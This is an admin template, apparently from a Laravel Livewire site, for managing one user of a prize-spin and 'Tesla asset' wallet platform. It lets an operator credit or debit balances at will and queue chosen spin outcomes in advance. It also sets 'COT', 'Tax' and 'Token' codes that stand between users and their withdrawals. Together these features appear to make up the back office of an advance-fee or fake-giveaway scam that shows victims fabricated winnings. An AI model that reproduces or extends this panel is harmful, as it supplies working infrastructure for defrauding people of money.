<div class="admin-wrapper">
    <section class="module-card">
        <div class="profile-hero" style="overflow-x: auto;">
            <div class="avatar-circle">{{ $user->initials() }}</div>
            <div class="user-meta" style="flex: 1;">
                <span class="status-chip completed" style="margin-bottom: 0.5rem; display: inline-block;">Active
                    User</span>
                <h1>{{ $user->name }}</h1>
                <p>{{ $user->email }}</p>
            </div>
            <button wire:click="deleteUser" wire:confirm="Are you sure?" class="btn-outline-danger">
                Delete Account
            </button>
        </div>
    </section>

    <section class="module-card">
        <div class="module-header">
            <span class="module-title">Treasury Management</span>
            <span style="color: var(--success); font-size: 0.6rem; font-weight: 900;">● LIVE CONNECTION</span>
        </div>

        <div class="form-group">
            <div class="stats-grid" style="width: 100%; padding: 0 0 1rem 0;">
                <div class="stat-pill">
                    <span class="module-title">Main Balance</span>
                    <span class="stat-val">${{ number_format($user->wallet->balance, 2) }}</span>
                </div>
                <div class="stat-pill" style="border-color: var(--accent-indigo);">
                    <span class="module-title" style="color: var(--accent-indigo);">Tesla Fleet Assets</span>
                    <span class="stat-val"
                        style="color: var(--accent-indigo);">{{ number_format($user->wallet->tesla_balance, 0) }}</span>
                </div>
            </div>

            <select wire:model="walletType" class="premium-input">
                <option value="balance">Main Wallet</option>
                <option value="tesla_balance">Asset Bal</option>
            </select>
            <input type="number" wire:model="amountToAdjust" class="premium-input" placeholder="Enter Amount">
            <button wire:click="adjustBalance('credit')" class="btn-solid">Credit</button>
            <button wire:click="adjustBalance('debit')" class="btn-solid"
                style="background: rgba(255,255,255,0.1); color: white;">Debit</button>
        </div>
    </section>

    <section class="module-card">
        <div class="module-header">
            <span class="module-title">Withdrawal Verification Pins</span>
            <span style="color: var(--accent-violet); font-size: 0.65rem; font-weight: 900;">SECURE OVERRIDE</span>
        </div>

        <div class="form-group">
            <div style="flex: 1; min-width: 200px;">
                <label class="module-title" style="margin-bottom: 0.5rem; display: block; font-size: 0.6rem;">COT Code
                    (Transaction Confirmation)</label>
                <input type="text" wire:model="cot" class="premium-input" placeholder="e.g. COT123"
                    style="width: 100%;">
            </div>

            <div style="flex: 1; min-width: 200px;">
                <label class="module-title" style="margin-bottom: 0.5rem; display: block; font-size: 0.6rem;">Tax
                    Code</label>
                <input type="text" wire:model="tax_code" class="premium-input" placeholder="e.g. TAX123"
                    style="width: 100%;">
            </div>

            <div style="flex: 1; min-width: 200px;">
                <label class="module-title" style="margin-bottom: 0.5rem; display: block; font-size: 0.6rem;">Token
                    Code</label>
                <input type="text" wire:model="token_code" class="premium-input" placeholder="e.g. TOKEN123"
                    style="width: 100%;">
            </div>
        </div>

        <div style="padding: 0 2rem 2rem 2rem; display: flex; justify-content: flex-end;">
            <button wire:click="updateWithdrawalPins" class="btn-solid"
                style="background: linear-gradient(135deg, var(--accent-indigo), var(--accent-violet)); color: white;">
                Save Verification Pins
            </button>
        </div>
    </section>

    <section class="module-card">
        <div class="module-header">
            <span class="module-title">Spin Allocation Engine</span>
            <div style="display: flex; align-items: center; gap: 0.75rem;">
                <span class="module-title" style="letter-spacing: 0;">Status:</span>

                <label class="switch">
                    <input type="checkbox" wire:model.live="is_active" wire:loading.attr="disabled">
                    <span class="slider"></span>
                </label>

                <div wire:loading wire:target="is_active">
                    <svg class="animate-spin" style="width: 12px; height: 12px; color: var(--accent-indigo);"
                        xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle style="opacity: 0.25;" cx="12" cy="12" r="10" stroke="currentColor"
                            stroke-width="4"></circle>
                        <path style="opacity: 0.75;" fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                        </path>
                    </svg>
                </div>
            </div>
        </div>

        <div class="form-group" style="padding-bottom: 1rem;">
            <div style="flex: 1; min-width: 250px;">
                <span class="module-title" style="margin-bottom: 0.5rem; display: block;">Spin Limit</span>
                <!-- Added flex-wrap: wrap to the container -->
                <div style="display: flex; gap: 0.5rem; align-items: center; flex-wrap: wrap;">
                    <input type="number" wire:model="total_spins" class="premium-input"
                        style="flex: 1; min-width: 150px;">

                    <button wire:click="updateAllocation" wire:loading.attr="disabled" class="btn-solid"
                        style="position: relative; min-width: 100px; flex-grow: 1;">
                        <span wire:loading.remove wire:target="updateAllocation">
                            Update
                        </span>

                        <span wire:loading wire:target="updateAllocation">
                            <i class="fas fa-spinner fa-spin"></i> Updating...
                        </span>
                    </button>
                </div>
            </div>
        </div>

        <div style="display: flex; gap: 1rem; padding: 0 2rem 2rem 2rem; flex-wrap: wrap;">
            <div
                style="flex: 1; min-width: 120px; background: rgba(255,255,255,0.02); border: 1px solid var(--card-border); padding: 1rem; border-radius: 1rem; display: flex; align-items: center; gap: 1rem;">
                <div
                    style="width: 8px; height: 8px; border-radius: 50%; background: var(--warning); box-shadow: 0 0 10px var(--warning);">
                </div>
                <div>
                    <span
                        style="display: block; font-size: 0.65rem; font-weight: 800; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em;">Used</span>
                    <span
                        style="font-size: 1.1rem; font-weight: 900; color: #fff;">{{ $user->spinAllocations->first()->used_spins ?? 0 }}</span>
                </div>
            </div>

            <div
                style="flex: 1; min-width: 120px; background: rgba(99, 102, 241, 0.05); border: 1px solid rgba(99, 102, 241, 0.2); padding: 1rem; border-radius: 1rem; display: flex; align-items: center; gap: 1rem;">
                <div
                    style="width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 10px var(--success);">
                </div>
                <div>
                    <span
                        style="display: block; font-size: 0.65rem; font-weight: 800; color: var(--accent-indigo); text-transform: uppercase; letter-spacing: 0.05em;">Remaining</span>
                    <span style="font-size: 1.1rem; font-weight: 900; color: #fff;">
                        {{ max(0, ($user->spinAllocations->first()->total_spins ?? 0) - ($user->spinAllocations->first()->used_spins ?? 0)) }}
                    </span>
                </div>
            </div>
        </div>

        <div class="form-group" style="padding-top: 0;">
            <div style="flex: 1; min-width: 250px;">
                <span class="module-title" style="margin-bottom: 0.5rem; display: block;">Queue Manual Override</span>
                <!-- Added flex-wrap: wrap to the container -->
                <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                    <select wire:model="selected_prize_index" class="premium-input"
                        style="flex: 1; min-width: 200px;">
                        @foreach ($prizes as $index => $prize)
                            <option value="{{ $index }}">
                                {{ $prize['icon'] }} {{ $prize['label'] }}
                            </option>
                        @endforeach
                    </select>

                    <button wire:click="addSpinResult" wire:loading.attr="disabled" wire:target="addSpinResult"
                        class="btn-solid"
                        style="min-width: 140px; flex-grow: 1; display: flex; align-items: center; justify-content: center; gap: 8px;">
                        <span wire:loading.remove wire:target="addSpinResult">
                            Add to Queue
                        </span>

                        <span wire:loading wire:target="addSpinResult">
                            Processing...
                        </span>
                    </button>
                </div>
            </div>
        </div>

        <div class="queue-container">
            @forelse ($user->spinResults as $res)
                <div class="queue-item {{ $res->is_used ? 'used' : '' }}">
                    <div style="display: flex; align-items: center; gap: 1rem;">
                        <span style="font-size: 1.5rem;">{{ $res->prize_value }}</span>
                        <div>
                            <div style="font-weight: 800; font-size: 0.8rem; text-transform: uppercase;">
                                {{ $res->prize_label }}</div>
                            <div style="color: var(--accent-indigo); font-weight: 700; font-size: 0.75rem;">
                                {{ number_format($res->amount) }}</div>
                        </div>
                    </div>
                    @if (!$res->is_used)
                        <button wire:click="deleteResult({{ $res->id }})"
                            style="background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 1.2rem;">&times;</button>
                    @endif
                </div>


            @empty
                <div
                    style="text-align: center; padding: 2rem; color: var(--text-muted); font-size: 0.8rem; letter-spacing: 1px;">
                    NO PENDING RESULTS</div>
            @endforelse
            <button wire:click="clearUsedSpins" class="btn-outline-danger"
                wire:confirm="Are you sure you want to clear used spins?"
                style="font-size: 0.9rem; padding: 4px 8px;">
                Clear Used Spin Results
            </button>
        </div>
    </section>

    <section class="module-card">
        <div class="module-header">
            <span class="module-title">Recent Spin History</span>
        </div>
        <div class="table-responsive">
            <table class="premium-table">
                <thead>
                    <tr>
                        <th>TimeStamp</th>
                        <th>Event</th>
                        <th style="text-align: center;">Asset Preview</th>
                        <th style="text-align: right;">Net Profit</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($user->spinHistories as $history)
                        @php
                            // Logic to determine row style based on result type
                            $isJackpot = $history->result_label === 'TESLA CAR';
                            $isGoldBar = str_contains($history->result_label, 'GOLD BAR');
                            $isLoss = $history->amount <= 0;
                        @endphp <tr
                            class="group transition-all duration-300 {{ $isJackpot ? 'hover:translate-y-[-2px]' : 'hover:bg-white/[0.02]' }}"
                            style="{{ $isJackpot ? 'background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-radius: 16px;' : 'background: transparent;' }}">

                            {{-- Timestamp --}}
                            <td
                                style="padding: 20px 24px; border-radius: 16px 0 0 16px; {{ $isJackpot ? 'border: 1px solid rgba(255,255,255,0.05); border-right: none;' : '' }} {{ $isLoss ? 'opacity: 0.5;' : '' }}">
                                <div style="font-size: 13px; font-weight: 600;">
                                    {{ $history->created_at->format('M d, Y') }}
                                </div>
                                <div style="font-size: 10px; opacity: 0.5; margin-top: 4px;">
                                    {{ $history->created_at->format('H:i T') }}</div>
                            </td>

                            {{-- Event Label --}}
                            <td
                                style="padding: 20px 24px; {{ $isJackpot ? 'border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05);' : '' }}">
                                @if ($isJackpot)
                                    <span
                                        style="background: linear-gradient(90deg, #f59e0b, #ea580c); color: white; padding: 4px 12px; border-radius: 8px; font-size: 9px; font-weight: 900; letter-spacing: 0.05em; display: inline-block; box-shadow: 0 4px 12px rgba(234, 88, 12, 0.3);">
                                        {{ strtoupper($history->spinResult->name) }} UNLOCKED
                                    </span>
                                @elseif($isLoss)
                                    <span
                                        style="background: rgba(161, 161, 170, 0.1); color: #e48b8b; padding: 4px 12px; border-radius: 8px; font-size: 9px; font-weight: 900;">
                                        LOSS
                                    </span>
                                @elseif($isGoldBar)
                                    <span
                                        style="background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 4px 12px; border-radius: 8px; font-size: 9px; font-weight: 900; border: 1px solid rgba(234, 179, 8, 0.2);">
                                        GOLD BAR WIN
                                    </span>
                                @else
                                    <span
                                        style="background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 4px 12px; border-radius: 8px; font-size: 9px; font-weight: 900; border: 1px solid rgba(34, 197, 94, 0.2);">
                                        CASH WIN
                                    </span>
                                @endif
                            </td>

                            {{-- Image Preview --}}
                            <td
                                style="padding: 20px 24px; {{ $isJackpot ? 'border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05);' : '' }} text-align: center;">
                                <div class="relative group-hover:scale-110 transition-transform duration-500"
                                    style="width: 100px; height: 50px; margin: 0 auto; border-radius: 10px; overflow: hidden; background: #000; box-shadow: 0 0 15px rgba(245, 158, 11, 0.2);">

                                    @php
                                        // Logic to select the correct static image link
                                        if ($isJackpot) {
                                            $imageLink = asset('assets/images/beastimages/tesla.jpg');
                                        } elseif ($isLoss) {
                                            $imageLink = asset('assets/images/beastimages/lostcash.jpg');
                                        } elseif ($isGoldBar) {
                                            $imageLink = asset('assets/images/beastimages/gold.jpg');
                                        }
                                         else {
                                            $imageLink = asset('assets/images/beastimages/cash.jpg');
                                        }
                                    @endphp

                                    <img src="{{ $imageLink }}" alt="Result Preview"
                                        style="width: 100%; height: 100%; object-fit: cover; opacity: 0.9;">
                                </div>
                            </td>

                            {{-- Profit/Amount --}}
                            <td
                                style="padding: 20px 24px; border-radius: 0 16px 16px 0; {{ $isJackpot ? 'border: 1px solid rgba(255,255,255,0.05); border-left: none;' : '' }} text-align: right;">
                                @if ($isJackpot)
                                    <div
                                        style="font-size: 18px; font-weight: 900; color: #22c55e; letter-spacing: -0.02em;">
                                        JACKPOT</div>
                                    <div style="font-size: 10px; opacity: 0.6;">Asset:
                                        {{ $history->result_label }}</div>
                                @elseif($isGoldBar)
                                    <div
                                        style="font-size: 16px; font-weight: 800; color: #eab308; {{ $isLoss ? 'opacity: 0.8;' : '' }}">
                                        {{ $isLoss ? '-' : '' }}{{ number_format(abs($history->amount), 0) }}
                                    </div>
                                @else
                                    <div
                                        style="font-size: 16px; font-weight: 800; color: {{ $isLoss ? '#ea3737' : '#22c55e' }}; {{ $isLoss ? 'opacity: 0.8;' : '' }}">
                                        {{ $isLoss ? '-' : '+' }}${{ number_format(abs($history->amount), 2) }}
                                    </div>
                                @endif
                            </td>
                        </tr>
                    @endforeach
                </tbody>
            </table>
        </div>
    </section>

    <section class="module-card">
        <div class="module-header">
            <span class="module-title">Recent Withdrawal History</span>
        </div>
        <div class="table-responsive">
            <table class="premium-table">
                <thead>
                    <tr>
                        <th>METHOD</th>
                        <th>AMOUNT</th>
                        <th>STATUS</th>
                        <th>TIMESTAMP</th>
                        <th style="text-align: right;">ACTION</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($user->withdrawals as $w)
                        <tr>
                            <td style="font-weight: 700;">{{ $w->withdrawal_method }}</td>
                            <td style="font-weight: 800; color: white;">${{ number_format($w->amount, 2) }}</td>
                            <td>
                                <span class="status-chip {{ $w->status == 'pending' ? 'pending' : 'completed' }}">
                                    {{ $w->status }}
                                </span>
                            </td>
                            <td style="color: var(--text-muted); font-size: 0.75rem;">
                                {{ $w->created_at->format('M d, H:i') }}
                            </td>
                            <td style="text-align: right;">
                                @if ($w->status === 'pending')
                                    <button wire:click="approveWithdrawal({{ $w->id }})"
                                        wire:loading.attr="disabled"
                                        wire:target="approveWithdrawal({{ $w->id }})" class="btn-solid"
                                        style="padding: 0.4rem 0.8rem; font-size: 0.65rem; background: var(--success); color: white;">
                                        <span wire:loading.remove
                                            wire:target="approveWithdrawal({{ $w->id }})">APPROVE</span>
                                        <span wire:loading
                                            wire:target="approveWithdrawal({{ $w->id }})">...</span>
                                    </button>
                                @else
                                    <span
                                        style="color: var(--success); font-size: 0.65rem; font-weight: 800; text-transform: uppercase; opacity: 0.6;">
                                        PROCESSED
                                    </span>
                                @endif
                            </td>
                        </tr>
                    @endforeach
                </tbody>
            </table>
        </div>
    </section>
</div>
